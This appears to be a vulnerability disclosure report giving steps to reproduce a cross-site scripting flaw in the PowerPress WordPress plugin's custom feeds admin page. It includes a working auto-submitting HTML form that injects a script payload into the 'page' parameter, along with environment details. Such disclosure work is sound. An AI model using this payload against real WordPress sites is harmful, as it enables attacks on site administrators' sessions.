# Steps to Reproduce
After installing the plugin you can visit this html to trigger the XSS:
```html
<form action="http://localhost/wp-admin/admin.php?page=powerpress%2Fpowerpressadmin_customfeeds.php" target="_blank" method="post">
    <input type="hidden" name="page" value='"><script>alert(1)</script>'>
</form>

<script>
    document.querySelector("form").submit()
</script>
```
# Additional Information
## Environment
Wordpress: 6.5.2
PHP: php:8.1-fpm
This POC use nginx configuration from https://github.com/dimasma0305/dockerized-wordpress-debug-setup

> Note: You can see my video below for demonstration.
